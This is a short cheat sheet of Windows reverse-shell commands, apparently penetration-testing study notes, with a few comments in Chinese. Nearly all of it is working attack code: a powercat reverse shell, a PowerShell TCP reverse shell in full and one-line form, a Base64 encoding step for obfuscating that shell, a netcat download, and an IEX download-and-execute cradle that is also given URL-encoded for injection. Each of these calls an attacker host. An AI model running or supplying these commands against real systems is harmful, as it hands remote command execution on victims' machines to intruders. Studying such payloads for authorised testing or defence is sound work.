# Reverse_Shell

## rsg

<https://github.com/mthbernardes/rsg>

## general

### powershell

### powercat

```shell
powercat -c 172.16.8.1 -p 1234 -e cmd.exe
```

### powershell

#### reverse shell

```powershell
# 被控端
$client = New-Object System.Net.Sockets.TCPClient('172.16.8.1',1234);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush();
}
$client.Close();

# 单行行式的代码
C:\Users\offsec> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.45.235',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

##### encode reverse shell

```powershell
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

$EncodedText = [Convert]::ToBase64String($Bytes)

$EncodedText
```

#### download file

```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://kali/binaries/nc.exe','c:\windows\temp\nc.exe')"
```

##### download powercat and execute

```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.223/powercat.ps1");powercat -c 192.168.45.223 -p 4444 -e powershell
```

```powershell
IEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.235%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.45.235%20-p%204444%20-e%20powershell
```
